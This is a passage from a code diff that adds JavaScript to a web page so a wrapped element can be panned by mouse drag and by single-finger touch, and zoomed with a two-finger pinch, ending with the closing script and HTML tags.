+      stx = tx;        sty = ty;
+      e.preventDefault();
+    });
+    document.addEventListener('mousemove', function (e) {
+      if (!dragging) return;
+      tx = stx + (e.clientX - dsx);
+      ty = sty + (e.clientY - dsy);
+      applyTransform();
+    });
+    document.addEventListener('mouseup', function () {
+      if (dragging) { dragging = false; wrap.classList.remove('dragging'); }
+    });
+
+    // Touch: pinch-to-zoom + single-finger pan
+    var lastDist = 0, pinchStartScale = 1;
+    wrap.addEventListener('touchstart', function (e) {
+      if (e.touches.length === 2) {
+        var dx = e.touches[0].clientX - e.touches[1].clientX;
+        var dy = e.touches[0].clientY - e.touches[1].clientY;
+        lastDist = Math.hypot(dx, dy);
+        pinchStartScale = scale;
+      } else if (e.touches.length === 1) {
+        dragging = true;
+        dsx = e.touches[0].clientX; dsy = e.touches[0].clientY;
+        stx = tx; sty = ty;
+      }
+    }, { passive: true });
+    wrap.addEventListener('touchmove', function (e) {
+      if (e.touches.length === 2) {
+        e.preventDefault();
+        var dx   = e.touches[0].clientX - e.touches[1].clientX;
+        var dy   = e.touches[0].clientY - e.touches[1].clientY;
+        var dist = Math.hypot(dx, dy);
+        scale = Math.min(MAX, Math.max(MIN, pinchStartScale * (dist / lastDist)));
+        applyTransform();
+      } else if (e.touches.length === 1 && dragging) {
+        tx = stx + (e.touches[0].clientX - dsx);
+        ty = sty + (e.touches[0].clientY - dsy);
+        applyTransform();
+      }
+    }, { passive: false });
+    wrap.addEventListener('touchend', function () { dragging = false; });
+  })();
+  </script>
+</body>
+</html>
